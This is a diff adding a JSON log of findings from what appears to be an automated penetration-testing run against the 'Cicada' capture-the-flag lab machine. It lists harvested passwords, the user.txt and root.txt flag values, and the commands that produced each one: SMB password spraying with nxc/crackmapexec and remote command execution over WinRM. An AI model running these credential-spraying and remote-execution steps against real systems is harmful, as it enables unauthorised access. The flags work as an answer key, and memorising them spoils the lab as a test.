@@ -1,0 +1,72 @@
+[
+  {
+    "id": "0b4f4d353f784047b795cd2f2cf27885",
+    "at": "2026-11-07T23:33:56.174100+00:00",
+    "kind": "credential",
+    "title": "Cicada Corp default new-hire password (from HR share Notice from HR.txt)",
+    "value": "Cicada$M6Corpb*@Lp#nZp!8",
+    "source": "ls -la /tmp/hr && echo '--- FILE CONTENTS ---' && cat /tmp/hr/*",
+    "evidence": "Exact value appears in terminal output",
+    "evidence_backed": true
+  },
+  {
+    "id": "55dc765b4ea34934af95888d81d7987a",
+    "at": "2026-11-07T23:35:16.091191+00:00",
+    "kind": "credential",
+    "title": "michael.wrightson SMB credential",
+    "value": "cicada.htb\\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8",
+    "source": "for b in nxc netexec crackmapexec; do command -v \"$b\" >/dev/null 2>&1 && { echo \"Using: $b\"; \"$b\" smb 10.129.231.149 -u /tmp/users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8' --continue-on-success; break; }; done",
+    "evidence": "Exact value appears in terminal output",
+    "evidence_backed": true
+  },
+  {
+    "id": "f210f6ea0e1244c6b8416ddc18caba45",
+    "at": "2026-11-07T23:40:24.287715+00:00",
+    "kind": "credential",
+    "title": "david.orelious SMB password (LDAP description)",
+    "value": "aRt$Lp#7t*VQ!3",
+    "source": "nxc winrm 10.129.231.149 -u david.orelious -p 'aRt$Lp#7t*VQ!3'",
+    "evidence": "Exact value appears in terminal output",
+    "evidence_backed": true
+  },
+  {
+    "id": "f779f660601c4cea898c0526f3dc92c9",
+    "at": "2026-11-07T23:45:07.942123+00:00",
+    "kind": "credential",
+    "title": "emily.oscars validated credential",
+    "value": "emily.oscars:Q!3@Lp#M6b*7t*Vt",
+    "source": "nxc winrm 10.129.231.149 -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt' -x \"type C:\\Users\\emily.oscars.CICADA\\Desktop\\user.txt\"",
+    "evidence": "Exact value appears in terminal output",
+    "evidence_backed": true
+  },
+  {
+    "id": "18fb6e18c1fa4c6f8107fa0d0da820a6",
+    "at": "2026-11-07T23:57:13.636831+00:00",
+    "kind": "credential",
+    "title": "CICADA-DC root.txt flag",
+    "value": "14ac53482b5dd0b49c56df18ef840e34",
+    "source": "nxc winrm 10.129.231.149 -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt' -X \"type C:\\Users\\emily.oscars.CICADA\\AppData\\Local\\Temp\\loot\\root.txt\" | tee /home/kali/.local/share/harp/runs/harp-run-322b85097a28/step3_loot_type.txt",
+    "evidence": "Exact value appears in terminal output",
+    "evidence_backed": true
+  },
+  {
+    "id": "20f9532fe02a4df6b1ff7f8ac1b0b95b",
+    "at": "2026-11-08T01:07:21.327561+00:00",
+    "kind": "flag",
+    "title": "user.txt",
+    "value": "37e1325f53fbee7ae2f721c8dd8854ea",
+    "source": "nxc winrm 10.129.231.149 -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt' -x \"type C:\\Users\\emily.oscars.CICADA\\Desktop\\user.txt\"",
+    "evidence": "Flag-shaped value captured from terminal output",
+    "evidence_backed": true
+  },
+  {
+    "id": "3be86366d5574494b70dc9c6c8cdc1c5",
+    "at": "2026-11-08T01:07:21.332928+00:00",
+    "kind": "flag",
+    "title": "root.txt",
+    "value": "14ac53482b5dd0b49c56df18ef840e34",
+    "source": "nxc winrm 10.129.231.149 -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt' -X \"type C:\\Users\\emily.oscars.CICADA\\AppData\\Local\\Temp\\loot\\root.txt\" | tee /home/kali/.local/share/harp/runs/harp-run-322b85097a28/step3_loot_type.txt",
+    "evidence": "Flag-shaped value captured from terminal output",
+    "evidence_backed": true
+  }
+]
